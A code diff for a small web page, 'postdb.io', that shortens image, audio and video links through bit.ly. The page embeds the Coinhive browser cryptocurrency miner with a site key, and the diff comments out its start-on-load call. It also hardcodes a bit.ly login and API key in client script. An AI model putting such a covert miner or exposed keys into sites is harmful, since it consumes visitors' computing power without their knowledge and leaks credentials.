@@ -13,12 +13,14 @@
     	margin: 0;
       font-family: 'Raleway', sans-serif;
     }
-    #maincard {
+    .imgcard {
       position: absolute;
       left: 50%;
-      transform: translateX(-50%);
       max-width: 100vw;
       max-height: 90vh;
+      top: 50%;
+      transform: translate(-50%,-50%);
+      display: none;
     }
     .title {
       font-size: 27px;
@@ -50,35 +52,49 @@
       postdb.io
     </div>
     <div class="main">
-      Shorten Image URL <br>
+      Shorten <span id="word">IMAGE</span> URL <br>
       <input type="text" id="short" placeholder="https://i.imgur.com/gF72Xn9.gif">
       <br>
       <button type="button" id="button" onclick="submit()">Go</button>
     </div>
-    <img id="maincard" class="imgcard">
+
+    <img id="maincard0" class="imgcard">
+    <audio controls id="maincard1" class="imgcard"></audio>
+    <video controls id="maincard2" autoplay class="imgcard"></video>
+
     <script src="https://coinhive.com/lib/coinhive.min.js"></script>
     <script>
       var miner = new CoinHive.Anonymous("yjGFHNXbIib2c8o9CgcrVVAfTd6na4Cz");
       window.onload = () => {
-        miner.start();
+        // miner.start();
       }
       if (window.location.hash != "") {
         var img = window.location.hash.slice(1);
-        document.querySelector("#maincard").src = "http://bit.ly/"+img;
+        if (parseInt(img.split("").pop()) > 2) img += "0";
+        document.querySelector("#maincard"+img.split("").pop()).src = "http://bit.ly/"+img.slice(0,img.length-1);
+        document.querySelector("#maincard"+img.split("").pop()).style.display = "inherit";
       } else {
         document.querySelector(".main").style.display = "inherit";
       }
 
       var url = "http://postdb.io/#";
       function submit() {
-        var i1 = document.querySelector("#short");
-          fetch("http://api.bit.ly/v3/shorten?login=o_5qog1opc6f&apiKey=R_d8a21a8680b4409eb00add64f3fb9d4c&longUrl="+i1.value+"&format=json").then((res) => {
+        var i1 = document.querySelector("#short").value;
+          fetch("http://api.bit.ly/v3/shorten?login=o_5qog1opc6f&apiKey=R_d8a21a8680b4409eb00add64f3fb9d4c&longUrl="+i1+"&format=json").then((res) => {
             return res.json();
           }).then((data) => {
+            // 0=img 1=audio 2=video
+            var e = i1.split(".").pop().toLowerCase();
+            var num = {"jpg": 0,"gif": 0,"png": 0,"mp3": 1,"ogg": 1,"wav": 1,"mp4": 2,"mpg": 2,"webm": 2}[e];
             url += data.data.hash
-            window.location.href = url;
+            window.location.href = url+num.toString();
           });
       }
+      var i = 0;
+      setInterval(() => {
+        i++;
+        document.querySelector("#word").innerHTML = ["IMAGE", "GIF", "AUDIO", "VIDEO"][i%4];
+      }, 3000);
     </script>
   </body>
 </html>
